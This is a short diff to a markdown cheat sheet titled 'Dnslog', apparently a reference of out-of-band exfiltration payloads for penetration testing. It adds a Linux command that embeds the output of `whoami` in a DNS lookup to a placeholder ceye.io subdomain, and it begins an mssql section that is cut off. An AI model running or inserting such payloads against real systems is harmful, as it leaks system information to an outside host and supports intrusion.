@@ -1,5 +1,10 @@
 # Dnslog
 
+## Linux
+```bash
+ping `whoami`.xxxxx.ceye.io
+```
+
 ## mssql
 ```sql
 DECLARE @host varchar(1024);
